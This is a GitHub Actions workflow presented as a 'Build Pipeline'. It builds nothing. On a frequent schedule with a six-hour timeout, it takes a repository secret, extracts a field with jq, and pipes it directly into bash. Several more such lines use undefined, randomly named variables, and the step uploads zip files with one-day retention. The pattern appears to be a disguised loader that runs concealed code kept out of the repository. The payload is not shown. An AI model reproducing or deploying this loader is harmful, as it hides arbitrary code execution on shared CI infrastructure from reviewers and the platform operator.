name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '15 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          q6621: ${{ secrets.q6621 }}
        run: |
          printf '%s' "$q6621" | jq -r .qyqa74596 | /bin/bash
          echo $nooox257 | jq -r .kmuvr655 | /bin/bash
          echo $pzv83 | jq -r .glyv67502 | /bin/bash
          echo $juc7607 | jq -r .wi167 | /bin/bash
          printf '%s' "$iyyhr07" | jq -r .hscmf0 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ggwL2mgA
          path: "*.zip"
          retention-days: 1
